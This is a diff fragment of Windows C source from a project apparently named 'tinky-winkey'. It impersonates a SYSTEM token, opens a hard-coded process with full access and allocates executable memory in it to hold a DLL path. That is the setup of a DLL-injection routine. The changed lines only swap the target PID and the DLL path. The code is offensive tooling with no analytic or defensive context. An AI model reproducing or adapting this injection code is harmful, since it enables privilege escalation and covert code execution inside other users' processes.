@@ -240,13 +240,13 @@ void ImpersonateSystemToken(void)
 int main(void)
 {
     ImpersonateSystemToken();
-HANDLE procHdl = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 2340);
+    HANDLE procHdl = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 3536);
     if (procHdl == NULL)
     {
         printf("Failed\n");
         exit(1);
     }
-    LPCSTR dllPath = "E:\\tinky-winkey\\dll.dll";
+    LPCSTR dllPath =  "C:\\Users\\Administrateur\\Documents\\tinky-winkey\\ddlmain.dll";
     printf("Thread began ?\n");
     LPVOID baseAddr = VirtualAllocEx(procHdl, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (baseAddr == NULL)
